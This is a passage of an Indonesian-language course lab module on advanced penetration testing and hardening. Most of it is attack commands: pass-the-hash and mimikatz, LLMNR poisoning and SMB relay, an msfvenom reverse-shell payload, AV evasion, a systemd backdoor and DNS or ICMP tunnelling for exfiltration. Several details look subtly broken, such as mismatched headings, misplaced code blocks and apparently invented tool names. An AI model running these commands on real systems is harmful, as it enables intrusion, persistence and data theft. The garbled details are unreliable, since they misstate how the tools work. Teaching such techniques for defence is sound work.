# Praktikum Modul 4: Advanced Penetration Testing dan Security Hardening

## Pendahuluan

Praktikum ini membahas teknik-teknik lanjutan dalam penetration testing dan implementasi security hardening. Siswa akan mempelajari metodologi advanced exploitation, post-exploitation, dan cara mengamankan sistem dari serangan-serangan kompleks.

## Tujuan Pembelajaran

Setelah menyelesaikan praktikum ini, siswa diharapkan mampu:
1. Melakukan advanced exploitation techniques
2. Mengimplementasikan post-exploitation methodology
3. Menerapkan security hardening measures
4. Menggunakan advanced security tools
5. Membuat comprehensive security assessment

## Persiapan Lab Environment

### A. Advanced Lab Setup

1. **Network Segmentation**
   ```bash
   # Setup multiple network segments
   DMZ: 192.168.1.0/24
   Internal: 192.168.2.0/24
   Management: 192.168.3.0/24
   ```

2. **Target Systems**
   - Enterprise Windows Domain
   - Linux Server Farm
   - Web Application Stack
   - Network Infrastructure

### B. Advanced Tools Setup

1. **Custom Tools Installation**
   ```bash
   # Install advanced tools
   sudo apt install -y \
       empire \
       covenant \
       bloodhound \
       responder \
       crackmapexec
   ```

2. **Wireless Testing Tools**
   ```bash
   # Install wireless tools
   sudo apt install -y \
       aircrack-ng \
       wifite \
       kismet \
       hcxdumptool \
       hashcat
   ```

## Lab 1: Advanced Network Attacks

### A. Active Directory Exploitation

1. **Domain Enumeration**
   ```bash
   # BloodHound setup
   sudo neo4j start
   bloodhound &
   
   # PowerView usage
   Import-Module .\PowerView.ps1
   Get-NetDomain
   Get-NetUser
   ```

2. **Lateral Movement**
   ```bash
   # Pass the Hash
   crackmapexec smb 192.168.2.0/24 -u Administrator -H "<HASH>"
   
   # Token Impersonation
   mimikatz # sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:<HASH>
   ```

### B. Advanced Network Attacks

1. **MITM Attacks**
   ```bash
   # ARP Spoofing
   ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.0/24/
   
   # DNS Spoofing
   responder -I eth0 -wrfv
   ```

2. **Protocol Attacks**
   ```bash
   # LLMNR/NBT-NS Poisoning
   responder -I eth0 -rv
   
   # SMB Relay
   ntlmrelayx.py -tf targets.txt -smb2support
   ```

## Lab 2: Advanced Web Application Testing

### A. Advanced Web Exploitation

1. **API Testing**
   ```bash
   # JWT Testing
   jwt_tool.py <token> -T
   
   # GraphQL Analysis
   graphql-map -s http://target/graphql
   ```

2. **Advanced Injection**
   ```bash
   # NoSQL Injection
   nosqlmap -u "http://target" -D database -C collection --dump
   
   # XML External Entity
   xmlrpc_bruteforcer.py -u http://target/xmlrpc.php -w wordlist.txt
   ```

### B. Web App Security Testing

1. **Authentication Bypass**
   ```bash
   # OAuth Testing
   oauth_tester.py -c client_id -s client_secret -t target
   
   # 2FA Bypass
   burp_2fa_bypass.py -u http://target -w wordlist.txt
   ```

2. **Session Management**
   ```bash
   # Session Analysis
   session_analyzer.py -c cookie.txt
   
   # Token Generation Pattern
   token_analyzer.py -t "session_token" -s samples.txt
   ```

## Lab 3: Advanced Exploitation Techniques

### A. Custom Exploit Development

1. **Buffer Overflow**
   ```python
   # Pattern creation
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
   
   # Offset finding
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
   ```

2. **Shellcode Generation**
   ```bash
   # Custom shellcode
   msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=192.168.1.100 \
     LPORT=443 \
     -f c \
     -e x64/xor \
     -b "\x00\x0a\x0d"
   ```

### B. Evasion Techniques

1. **AV Evasion**
   ```bash
   # Veil Framework
   ./Veil.py
   
   # Shellter
   shellter -a -f legitimate.exe -p custom_payload
   ```

2. **IDS/IPS Evasion**
   ```bash
   # Traffic Fragmentation
   fragroute 192.168.1.100
   
   # Protocol Tunneling
   dns2tcp -L 0.0.0.0:53 -R target:80
   ```

## Lab 4: Advanced Post Exploitation

### A. Advanced Persistence

1. **Windows Persistence**
   ```powershell
   # WMI Event Subscription
   $Filter = Set-WmiInstance -Class __EventFilter ...
   $Consumer = Set-WmiInstance -Class CommandLineEventConsumer ...
   Set-WmiInstance -Class __FilterToConsumerBinding ...
   ```

2. **Linux Persistence**
   ```bash
   # Kernel Module Backdoor
   insmod backdoor.ko
   
   # Systemd Service
   cat > /etc/systemd/system/backdoor.service << EOF
   [Unit]
   Description=Backdoor Service
   
   [Service]
   ExecStart=/usr/local/bin/backdoor
   
   [Install]
   WantedBy=multi-user.target
   EOF
   ```

### B. Data Exfiltration

1. **Covert Channels**
   ```bash
   # DNS Tunneling
   iodine -f 192.168.1.1 tunnel.com
   
   # ICMP Tunneling
   ptunnel -p 192.168.1.1 -lp 8000 -da target.com -dp 80
   ```

2. **Steganography**
   ```bash
   # Hide data in image
   steghide embed -cf cover.jpg -ef secret.txt
   
   # Extract hidden data
   steghide extract -sf cover.jpg
   ```

## Lab 5: Security Hardening

### A. System Hardening

1. **Linux Hardening**
   ```bash
   # Disable unused services
   systemctl disable bluetooth.service
   systemctl disable cups.service
   
   # Configure firewall
   ufw default deny incoming
   ufw default allow outgoing
   ufw allow ssh
   ufw enable
   ```

2. **Windows Hardening**
   ```powershell
   # Enable security features
   Set-ProcessMitigation -System -Enable DEP,SEHOP
   
   # Configure AppLocker
   Set-AppLockerPolicy -XmlPolicy C:\Windows\AppLocker\policy.xml
   ```

### B. Network Hardening

1. **Network Segmentation**
   ```bash
   # VLAN Configuration
   vconfig add eth0 10
   ip addr add 192.168.10.1/24 dev eth0.10
   
   # Access Control Lists
   iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
   ```

2. **Secure Communications**
   ```bash
   # Generate SSL Certificate
   openssl req -new -x509 -days 365 -nodes \
     -out server.crt \
     -keyout server.key
   
   # Configure SSH Hardening
   echo "Protocol 2" >> /etc/ssh/sshd_config
   echo "PermitRootLogin no" >> /etc/ssh/sshd_config
   ```

## Evaluasi

### A. Kriteria Penilaian

1. **Technical Proficiency (40%)**
   - Advanced exploitation
   - Custom tool development
   - Security hardening
   - Evasion techniques

2. **Documentation (30%)**
   - Technical documentation
   - Attack methodology
   - Mitigation strategies
   - Risk assessment

3. **Research Skills (30%)**
   - Vulnerability research
   - Exploit development
   - Security analysis
   - Tool creation

### B. Deliverables

1. **Technical Report**
   - Detailed methodology
   - Custom exploit code
   - Security configurations
   - Risk mitigation plans

2. **Research Paper**
   - Novel attack vectors
   - Defense strategies
   - Tool analysis
   - Future recommendations

## Referensi

1. Advanced Penetration Testing by Wil Allsopp
2. The Hacker Playbook 3 by Peter Kim
3. Red Team Field Manual (RTFM)
4. Gray Hat Hacking: The Ethical Hacker's Handbook
5. Advanced Infrastructure Penetration Testing
6. Attacking Network Protocols

## Appendix

### A. Custom Tools Development

1. **Python Exploit Framework**
   ```python
   #!/usr/bin/env python3
   
   class Exploit:
       def __init__(self, target):
           self.target = target
   
       def scan(self):
           # Implement scanning logic
           pass
   
       def exploit(self):
           # Implement exploitation
           pass
   ```

2. **PowerShell Post-Exploitation**
   ```powershell
   function Get-SystemInfo {
       $os = Get-WmiObject -Class Win32_OperatingSystem
       $cpu = Get-WmiObject -Class Win32_Processor
       $mem = Get-WmiObject -Class Win32_PhysicalMemory
       
       return @{
           OS = $os.Caption
           CPU = $cpu.Name
           Memory = $mem.Capacity
       }
   }
   ```

### B. Security Configurations

1. **Apache Hardening**
   ```apache
   # Security headers
   Header set X-Frame-Options "SAMEORIGIN"
   Header set X-XSS-Protection "1; mode=block"
   Header set X-Content-Type-Options "nosniff"
   
   # SSL configuration
   SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
   SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
   ```

2. **Nginx Hardening**
   ```nginx
   # Security headers
   add_header X-Frame-Options "SAMEORIGIN";
   add_header X-XSS-Protection "1; mode=block";
   add_header X-Content-Type-Options "nosniff";
   
   # SSL configuration
   ssl_protocols TLSv1.2 TLSv1.3;
   ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
   ```

### C. Advanced Attack Scenarios

1. **Enterprise Network**
   ```markdown
   1. Initial Access
      - Phishing campaign
      - Watering hole attack
      
   2. Lateral Movement
      - Domain enumeration
      - Pass-the-hash
      - Token impersonation
      
   3. Data Exfiltration
      - Covert channels
      - Steganography
      - Protocol tunneling
   ```

2. **Web Application**
   ```markdown
   1. Reconnaissance
      - API enumeration
      - Framework fingerprinting
      - Authentication analysis
      
   2. Exploitation
      - Custom exploits
      - Chain vulnerabilities
      - Session hijacking
      
   3. Persistence
      - Backdoor deployment
      - Webshell upload
      - Scheduled tasks
   ```

### D. Security Tools Matrix

1. **Advanced Exploitation**
   - [ ] Empire
   - [ ] Covenant
   - [ ] PoshC2
   - [ ] Cobalt Strike
   - [ ] Sliver

2. **Post Exploitation**
   - [ ] PowerSploit
   - [ ] Mimikatz
   - [ ] Empire
   - [ ] BloodHound
   - [ ] CrackMapExec

3. **Network Attacks**
   - [ ] Responder
   - [ ] Bettercap
   - [ ] Yersinia
   - [ ] Scapy
   - [ ] Wireshark

4. **Web Application**
   - [ ] Burp Suite Pro
   - [ ] OWASP ZAP
   - [ ] Acunetix
   - [ ] Netsparker
   - [ ] w3af
